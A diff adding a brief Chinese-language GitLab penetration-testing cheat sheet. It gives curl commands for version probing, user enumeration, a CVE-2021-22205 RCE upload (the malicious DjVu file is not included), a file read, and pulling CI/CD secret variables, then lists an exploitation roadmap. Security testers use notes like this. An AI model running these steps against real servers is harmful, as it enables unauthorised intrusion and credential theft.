@@ -1,0 +1,43 @@
+# GitLab 安全
+
+## 信息收集
+```bash
+# 版本探测
+curl http://target/help
+curl http://target/users/sign_in  # 看页面底部版本
+
+# 用户枚举
+curl http://target/api/v4/users?username=admin
+curl http://target/api/v4/users?page=1
+```
+
+## 常见漏洞
+```bash
+# CVE-2021-22205 未授权 RCE（<=13.10.3）
+curl -X POST "http://target/uploads/user" -F "file=@reverse.jpg"
+# 需上传恶意 DjVu 文件
+
+# CVE-2023-3932 任意文件读取
+curl "http://target/export/project/1/notes/download"
+
+# 注册功能滥用
+# 开启注册时，可枚举邮箱、创建账号
+```
+
+## Token 泄露
+```bash
+# CI/CD 变量泄露
+curl http://target/api/v4/projects/1/variables
+
+# 仓库中的 Token
+# 搜索内容中的 api_key, password, token
+```
+
+## 利用思路
+```bash
+# 1. 未授权访问项目/仓库
+# 2. 利用注册功能创建账号
+# 3. 利用已知 CVE 打 RCE
+# 4. 从 CI/CD 变量中提取凭据
+# 5. 通过 GitLab API 列举信息
+```
